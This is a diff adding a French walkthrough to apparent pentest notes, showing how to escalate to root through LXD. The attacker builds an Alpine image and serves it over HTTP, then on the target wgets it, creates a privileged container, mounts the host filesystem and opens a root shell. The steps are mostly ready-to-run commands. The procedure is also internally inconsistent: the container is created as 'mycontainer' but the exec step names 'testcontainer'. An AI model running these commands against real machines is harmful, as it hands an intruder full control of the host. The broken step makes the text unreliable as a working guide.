@@ -76,3 +76,68 @@ export TERM=xterm
 ## Escalade de privilèges via LXD
 
 Basé sur cet article: [LXC/LXD (Linux Container/Daemon) Privilege Escalation](https://exploit-notes.hdks.org/exploit/linux/container/lxc-lxd-privilege-escalation/)
+
+### Sur la machine Kali
+
+Préparez un conteneur linux et lancer un serveur http
+
+```
+git clone  https://github.com/saghul/lxd-alpine-builder.git
+cd lxd-alpine-builder
+sudo ./build-alpine
+python3 -m http.server 8000
+```
+
+### Sur la machine cible
+
+Téléchargez le fichier \<alpine tar.gz> et importez-le comme image dans LXC
+
+```
+cd /dev/shm
+wget http://<local-ip>:8000/<alpine tar.gz>
+lxc image import ./<alpine tar.gz> --alias myimage
+lxc image list
+```
+
+Créez un nouveau conteneur '**mycontainer**' basé sur l'image '**myimage**' qui vient d'être importée.
+
+```
+lxc init myimage mycontainer -c security.privileged=true
+```
+
+En cas de message **“**No storage pool found. Please create a new storage pool**.”** initialisez LXD d'abord et relancez la commande.
+
+```
+lxd init
+```
+
+Montez (mount) le répertoire principal / dans le répertoire /mnt/root du conteneur 'mycontainer' que vous venez de créer
+
+```
+lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
+```
+
+Démarrez votre conteneur
+
+```
+lxc start mycontainer
+```
+
+Lancez un Shell (note: l'image Alpine ne supporte qu'un shell sh)
+
+```
+lxc exec testcontainer /bin/sh
+```
+
+Vérifiez que vous êtes bien root
+
+```
+whoami
+```
+
+Rendez-vous dans le répertoire principal de la machine cible monté en /mnt/root et accédez en tant que root à toutes les données de la machine
+
+```
+cd /mnt/root
+
+```
